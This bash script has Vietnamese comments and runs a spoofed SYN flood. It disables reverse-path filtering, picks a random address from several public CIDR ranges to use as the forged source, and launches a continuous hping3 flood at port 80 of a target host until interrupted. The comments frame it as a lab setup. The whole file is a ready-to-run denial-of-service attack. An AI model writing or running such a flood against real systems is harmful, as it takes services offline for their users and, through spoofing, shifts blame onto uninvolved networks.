#!/bin/bash
set -euo pipefail

TARGET="10.10.2.2"
PORT=80
IP_RANGES=("1.1.16.0/20" "1.118.48.0/20" "1.2.0.0/23" "1.24.0.0/13")
#IP_RANGES=("1.1.16.0/20")
# 🛑 Dọn sạch khi nhấn Ctrl+C
cleanup() {
    echo -e "\n[!] Nhận Ctrl+C. Đang dừng hping3..."
    kill $HPING_PID 2>/dev/null
    wait $HPING_PID 2>/dev/null
    echo "[*] Đã dừng. Thoát."
    exit 0
}
trap cleanup SIGINT SIGTERM

# 🔧 Chuẩn bị môi trường lab
sudo sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1
sudo sysctl -w net.ipv4.conf.default.rp_filter=0 >/dev/null 2>&1

# 🎲 Chọn 1 dải CIDR ngẫu nhiên
CIDR=${IP_RANGES[$((RANDOM % ${#IP_RANGES[@]}))]}
echo "[*] Dải CIDR được chọn: $CIDR"

# 🌐 Tạo 1 IP ngẫu nhiên hợp lệ trong dải đó
SPOOF_IP=$(python3 -c "
import ipaddress, random
net = ipaddress.ip_network('$CIDR', strict=False)
print(random.choice(list(net.hosts())))
")
echo "[*] Source IP giả lập: $SPOOF_IP"
echo "[*] Target: $TARGET:$PORT | Đang flood liên tục... (Ctrl+C để dừng)"

# 🚀 Chạy flood liên tục
sudo hping3 -S "$TARGET" -p "$PORT" --flood -a "$SPOOF_IP" --quiet &
HPING_PID=$!

# Giữ script chạy đến khi Ctrl+C
wait $HPING_PID
